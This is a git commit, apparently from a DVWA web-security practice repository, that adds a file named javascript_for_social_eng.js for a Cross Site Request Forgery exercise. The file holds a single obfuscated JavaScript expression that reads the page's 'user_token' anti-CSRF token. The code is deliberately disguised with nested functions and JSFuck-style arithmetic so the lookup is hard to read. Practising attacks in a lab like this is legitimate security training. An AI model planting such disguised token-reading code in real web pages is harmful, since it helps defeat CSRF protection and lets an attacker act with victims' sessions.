ea907a426f4abf5dcdd5023d7f6fd5732997147c
Dinesh Saini <dinesh.saini.277@gmail.com>
2020-08-27 23:55:56 +0530

    Vulnerability: Cross Site Request Forgery (CSRF)

---
+++ dvwa/CSRF/scripts/javascript_for_social_eng.js
@@ -0,0 +1,2 @@
+(function(l){return l.value})((function(i){return (function(j){return ((function(k){return k})(j)).length == (function(){return +!+[]})()?((function(k){return k})(j))[!+[]<<+[]&+[]]:(function(){return ""})()})(((function(){return document})()).getElementsByName(i))})('user_token'))
+
